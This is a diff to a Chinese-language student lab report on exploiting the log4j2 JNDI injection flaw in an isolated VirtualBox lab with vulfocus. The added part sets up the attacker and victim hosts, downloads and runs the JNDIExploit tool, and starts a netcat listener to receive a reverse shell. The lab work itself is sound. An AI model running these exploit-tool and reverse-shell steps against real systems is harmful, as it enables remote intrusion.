@@ -1,5 +1,15 @@
 # 2024 夏网络空间安全综合实践-实验报告
 
+## 环境
+
+- `VirtualBox` Version 7.0.10 r158379 (Qt5.15.3)
+- `Kali-Attacker`:
+  - `VERSION_ID="2024.2"`
+  - `hostname`: `kali-attacker.mlab`
+- `ubuntu-victim`
+  - `22.04.3 LTS (Jammy Jellyfish)`
+  - `hostname`: `ubuntu-victim.mlab`
+
 ## 拉取 docker 镜像
 
 ### 网络配置
@@ -75,6 +85,44 @@ sudo apt update && sudo apt install jq
 成功访问 `web` 页面
 
 ![](.assets_img/README/vulfocus_web.png)
+
+![](.assets_img/README/tomcat_base64_missing.png)
+
+## 漏洞利用
+
+### JNDI 注入利用工具
+
+```bash
+wget https://github.com/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip  # 下载
+
+unzip JNDIExploit.v1.2.zip  # 解压
+```
+
+为方便分辨，这里攻击者的 `hostname` 已经配置为 `kali-attacker.mlab`
+
+下面在 `kali-attacker.mlab` 上运行 `JNDIExploit`：
+
+```bash
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i kali-attacker.mlab  # 运行
+```
+
+### 攻击者监听 7777 准备接收 shell
+
+```bash
+nc -l -p 7777
+```
+
+### 受害者环境配置
+
+由于直接在 `vulfocus` 中启动 `漏洞环境镜像` 默认 30 分钟后销毁，且由于其随机端口转发，不方便调试。故这里使用 `docker-compose` **直接启动** `log4j` 漏洞环境。
+
+```yaml
+services:
+  log4j:
+    image: "vulfocus/log4j2-rce-2021-12-09:1"
+    ports:
+      - "8080:8080"
+```
 
 ## 参考
 
